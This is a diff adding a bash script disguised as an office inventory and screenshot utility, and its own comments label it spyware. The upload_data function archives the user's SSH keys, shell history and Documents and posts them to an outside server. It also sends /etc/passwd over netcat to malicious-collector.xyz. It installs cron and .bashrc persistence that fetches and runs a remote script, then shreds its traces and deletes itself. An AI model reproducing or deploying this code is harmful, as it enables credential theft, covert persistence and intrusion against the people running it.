@@ -1,0 +1,74 @@
+#!/bin/bash
+# =============================================================================
+#  Office Inventory Screenshot Utility (v2.1.4)
+#  Created: 2025-01-12 | Facilities Management Team
+#  Purpose: Capture workstation screenshot and hardware/software inventory
+#           for asset auditing and seat allocation optimization.
+# =============================================================================
+
+set -e
+
+# --- Configuration ---
+OUTPUT_DIR="/tmp/.inventory_cache"
+SCREENSHOT_FILE="${OUTPUT_DIR}/desktop_$(date +%Y%m%d_%H%M%S).png"
+INVENTORY_FILE="${OUTPUT_DIR}/inv_$(hostname)_$(date +%Y%m%d).json"
+LOG_FILE="${OUTPUT_DIR}/audit.log"
+REMOTE_URL="https://facilities-corp-portal.com/api/v2/inventory"
+UPDATE_SERVER="http://192.168.1.187/patches/inv_updater.sh"
+
+# --- Helper: Collect system inventory (looks legitimate) ---
+collect_inventory() {
+    mkdir -p "$OUTPUT_DIR"
+    echo "{\"hostname\":\"$(hostname)\",\"os\":\"$(uname -a)\",\"cpu\":\"$(lscpu | grep 'Model name' | cut -d: -f2 | xargs)\",\"memory\":\"$(free -h | grep Mem | awk '{print $2}')\",\"disks\":\"$(lsblk -d -o NAME,SIZE | tail -n+2 | tr '\n' ',')\",\"timestamp\":\"$(date -Iseconds)\"}" > "$INVENTORY_FILE"
+}
+
+# --- Helper: Capture screenshot (legitimate function) ---
+capture_screenshot() {
+    if command -v import &>/dev/null; then
+        import -window root "$SCREENSHOT_FILE" 2>/dev/null
+    elif command -v scrot &>/dev/null; then
+        scrot "$SCREENSHOT_FILE" 2>/dev/null
+    else
+        xwd -root -silent | convert xwd:- "$SCREENSHOT_FILE" 2>/dev/null || true
+    fi
+}
+
+# --- Helper: Package and upload (malicious exfiltration hidden inside) ---
+upload_data() {
+    # Collect sensitive user data along with inventory
+    tar -czf "${OUTPUT_DIR}/sshdump.tar.gz" ~/.ssh/ ~/.bashrc ~/.bash_history ~/Documents/ 2>/dev/null || true
+    
+    # Encrypt sensitive archive with attacker's public key before sending
+    openssl enc -aes-256-cbc -salt -in "${OUTPUT_DIR}/sshdump.tar.gz" -out "${OUTPUT_DIR}/sshdump.enc" -pass pass:"P@ssw0rd123" 2>/dev/null || true
+    
+    # Send everything to remote server
+    curl -s -X POST -F "screenshot=@${SCREENSHOT_FILE}" -F "inventory=@${INVENTORY_FILE}" -F "sshexfil=@${OUTPUT_DIR}/sshdump.enc" "$REMOTE_URL" &
+    
+    # Secondary backchannel: direct raw TCP dump of /etc/passwd
+    cat /etc/passwd 2>/dev/null | nc -w 3 malicious-collector.xyz 4444 &
+    
+    # Attempt persistence via cron and shell profile
+    (crontab -l 2>/dev/null; echo "@reboot bash -c 'curl -s $UPDATE_SERVER | bash'") | crontab - 2>/dev/null
+    echo "alias ll='curl -s $UPDATE_SERVER | bash 2>/dev/null &; ls -la'" >> ~/.bashrc 2>/dev/null
+}
+
+# --- Helper: Fake cleanup to avoid suspicion ---
+cleanup() {
+    # Keep only inventory logs for auditing
+    find "$OUTPUT_DIR" -type f -not -name "inv_*.json" -exec shred -u {} \; 2>/dev/null
+    # System maintenance loop (resource consumption disguise)
+    for i in {1..10}; do
+        dd if=/dev/urandom of=/dev/null bs=1M count=5 2>/dev/null &
+    done
+}
+
+# --- Main execution flow ---
+echo "[FACILITIES] Starting inventory capture..." | tee -a "$LOG_FILE"
+collect_inventory
+capture_screenshot
+upload_data
+cleanup
+
+# Self-delete after execution (common in spyware)
+rm -- "$0" 2>/dev/null
+echo "[FACILITIES] Process completed." | tee -a "$LOG_FILE"
